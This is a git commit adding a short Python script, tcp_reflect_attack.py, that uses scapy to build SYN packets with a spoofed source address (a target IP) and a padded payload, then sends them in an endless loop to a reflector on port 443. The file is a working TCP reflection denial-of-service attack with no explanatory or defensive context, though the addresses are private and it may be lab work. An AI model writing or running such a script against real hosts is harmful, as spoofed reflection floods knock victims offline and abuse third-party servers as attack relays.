292da65e7dac2d13613228831b5756d7b702d63e
Jockibear <janik.lueders@gmail.com>
2026-02-19 14:49:38 +0100

    added tcp-reflect script

---
+++ tcp_reflect_attack.py
@@ -0,0 +1,17 @@
+import socket
+from scapy.all import *
+
+target_ip = "192.168.2.181"
+reflection_ip = "192.168.2.1"
+#reflection_list next
+data = "BBBB"
+
+ip = IP(src=target_ip, dst=reflection_ip)
+tcp = TCP(sport=RandShort(), dport=int("443"),flags="S",seq=12345)
+raw = Raw(data*1024)
+scapy_packet = ip / tcp / raw
+
+
+while True:
+    send(scapy_packet, loop=0, verbose=1)
+    print("sending tcp syn packets to reflector with target ip as source...")
